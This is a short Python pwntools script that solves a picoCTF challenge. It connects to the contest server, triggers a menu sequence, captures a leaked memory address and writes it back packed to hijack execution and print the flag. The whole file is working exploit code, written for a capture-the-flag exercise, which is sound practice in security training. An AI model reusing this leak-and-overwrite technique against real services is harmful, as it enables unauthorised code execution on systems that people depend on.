from pwn import remote,p64


# nc to the right port
p = remote("mercury.picoctf.net",50361)

# read intro message
p.recvlines(8)
# select option I
p.sendline(b'I')

# receive their 1 line response and send a "Y" back
p.recvline()
p.sendline(b'Y')

# read intro message again
p.recvlines(8)

# get memory leak by picing option S and extracting the address
p.sendline(b'S')
p.recvuntil(b'Memory leak...0x')
address = p.recvline().decode()

# reformat the address to the desired format
packed_address = p64(int(address,16))

# read intro message + message from S option
p.recvlines(9)

# select option l
p.sendline(b'l')

# receive 1line response
p.recvline()

# write our packed address
p.sendline(packed_address)

# get a line
p.recvline()

# get our flag and print it
print(p.recvline().decode())

p.close()